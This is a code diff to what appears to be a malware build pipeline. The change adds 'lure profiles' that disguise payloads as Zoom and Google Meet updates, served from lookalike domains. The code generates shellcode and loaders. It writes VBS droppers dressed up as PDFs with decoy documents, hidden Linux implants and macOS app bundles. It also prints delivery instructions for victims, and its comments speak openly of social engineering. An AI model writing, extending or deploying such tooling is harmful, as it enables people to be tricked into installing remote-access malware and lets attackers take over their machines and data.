@@ -41,6 +41,25 @@ TARGETS: list[tuple[str, str]] = [
 
 ALPHABET = string.ascii_lowercase + string.digits
 
+# Lure profiles: the artifact names must match the social-engineering story of
+# the page the victim lands on ("zoom update", "google meet update").
+PROFILES: dict[str, dict[str, str]] = {
+    "zoom": {
+        "win": "Zoom-Update",
+        "linux": "zoom-update",
+        "mac": "Zoom Update",
+        "token": "Zoom",
+        "url": "https://us05web.telcom.stream",
+    },
+    "meet": {
+        "win": "Google-Meet-Update",
+        "linux": "google-meet-update",
+        "mac": "Google Meet Update",
+        "token": "Google-M",
+        "url": "https://meet.telcom.stream",
+    },
+}
+
 
 def rand4() -> str:
     return "".join(secrets.choice(ALPHABET) for _ in range(4))
@@ -102,7 +121,12 @@ class BuildRequest:
     interval: int = 60
     jitter: int = 35
     base_url: str = ""
+    profile: str = "zoom"
     targets: list[tuple[str, str]] = field(default_factory=lambda: list(TARGETS))
+
+    @property
+    def naming(self) -> dict[str, str]:
+        return PROFILES.get(self.profile, PROFILES["zoom"])
 
 
 @dataclass
@@ -120,12 +144,18 @@ class Artifact:
 
 
 def render_windows(
-    doc: str, suffix: str, loader_bytes: bytes, decoy_pdf: bytes, base_url: str
+    doc: str,
+    suffix: str,
+    loader_bytes: bytes,
+    decoy_pdf: bytes,
+    base_url: str,
+    doc_name: str = "",
 ) -> str:
     template = (TEMPLATES / "win" / "dropper.vbs.tmpl").read_text(encoding="utf-8")
     expr = vbs_string_expr(base64.b64encode(loader_bytes).decode())
     return (
         template.replace("{{DOC}}", doc)
+        .replace("{{TITLE}}", doc_name or doc)
         .replace("{{RAND4}}", suffix)
         .replace("{{LOADER_B64_EXPR}}", expr)
         .replace("{{DECOY_B64}}", base64.b64encode(decoy_pdf).decode())
@@ -149,7 +179,8 @@ def delivery_block(artifact_os: str, name: str, doc: str, sha: str) -> str:
     elif artifact_os == "darwin":
         howto = f"unzip then open the .app  ({name})"
     else:
-        howto = f"tar xzf {name} && ./install.sh"
+        script = name[: -len(".tar.gz")] + ".sh"
+        howto = f"tar xzf {name} && ./{script}"
     return f"{doc}\nsha256: {sha}\n{howto}\n"
 
 
@@ -213,14 +244,17 @@ class BuildPipeline:
         shellcode = self._generate("windows", arch, "shellcode", req)
         loader = self._compile_loader(shellcode, workdir)
         decoy = minimal_pdf(req.doc_name)
-        source = render_windows(doc, self._current_suffix, loader, decoy, req.base_url)
-        name = f"{doc}_{self._current_suffix}.pdf.vbs"
+        naming = req.naming
+        source = render_windows(
+            naming["win"], self._current_suffix, loader, decoy, req.base_url, req.doc_name
+        )
+        name = f"{naming['win']}_{self._current_suffix}.pdf.vbs"
         (self.artifacts_dir / name).write_text(source, encoding="utf-8")
         return name.encode()
 
     def _build_linux(self, req: BuildRequest, doc: str, arch: str, workdir: Path) -> bytes:
         implant = self._generate("linux", arch, "executable", req)
-        source = render_linux(doc, self._current_suffix, implant)
+        source = render_linux(req.naming["linux"], self._current_suffix, implant)
         dropper = workdir / "install.sh"
         dropper.write_text(source, encoding="utf-8")
         dropper.chmod(0o755)
@@ -230,9 +264,10 @@ class BuildPipeline:
         decoy_path = workdir / "decoy.pdf"
         decoy_path.write_bytes(minimal_pdf(req.doc_name))
 
-        name = f"invoice-{self._current_suffix}.tar.gz"
+        base = req.naming["linux"]
+        name = f"{base}-{self._current_suffix}.tar.gz"
         with tarfile.open(self.artifacts_dir / name, "w:gz") as tar:
-            tar.add(dropper, arcname="install.sh")
+            tar.add(dropper, arcname=f"{base}-{self._current_suffix}.sh")
             tar.add(implant_path, arcname=f".fleet-{self._current_suffix}")
             tar.add(decoy_path, arcname="decoy.pdf")
         return name.encode()
@@ -245,13 +280,13 @@ class BuildPipeline:
         decoy_path = workdir / "decoy.pdf"
         decoy_path.write_bytes(minimal_pdf(req.doc_name))
 
-        app_dir = workdir / f"{doc} {self._current_suffix}.app"
+        app_dir = workdir / f"{req.naming['mac']} {self._current_suffix}.app"
         subprocess.run(
             [
                 "bash",
                 str(TEMPLATES / "mac" / "build_app.sh"),
                 str(app_dir),
-                doc,
+                req.naming["mac"],
                 str(decoy_path),
                 str(implant_path),
             ],
@@ -262,7 +297,7 @@ class BuildPipeline:
         if not app_dir.is_dir():
             raise BuildError("mac bundle assembly failed")
 
-        name = f"{doc}_{self._current_suffix}.app.zip"
+        name = f"{req.naming['mac']}_{self._current_suffix}.app.zip"
         with zipfile.ZipFile(self.artifacts_dir / name, "w", zipfile.ZIP_DEFLATED) as zf:
             for path in sorted(app_dir.rglob("*")):
                 if path.is_file():
@@ -303,17 +338,17 @@ class BuildPipeline:
                 delivery=delivery,
                 doc_name=req.doc_name,
             )
-            self._record(result, req.transport)
+            self._record(result, req.transport, req.profile)
             results.append(result)
         return results
 
-    def _record(self, artifact: Artifact, transport: str) -> None:
+    def _record(self, artifact: Artifact, transport: str, profile: str = "") -> None:
         now = time.time()
         with self.db.connect() as conn:
             conn.execute(
                 "INSERT INTO artifacts (id, ts, os, arch, fmt, transport, name, path, sha256, "
-                "size, build_id, slug, delivery, doc_name) "
-                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                "size, build_id, slug, delivery, doc_name, profile) "
+                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                 (
                     artifact.id,
                     now,
@@ -329,6 +364,7 @@ class BuildPipeline:
                     artifact.slug,
                     artifact.delivery,
                     artifact.doc_name,
+                    profile,
                 ),
             )
             conn.execute(
@@ -356,4 +392,5 @@ def load_build_request(form: dict[str, str], config: Settings) -> BuildRequest:
         interval=int(form.get("interval") or "60"),
         jitter=int(form.get("jitter") or "35"),
         base_url=base_url.rstrip("/"),
+        profile=form.get("profile") or "zoom",
     )
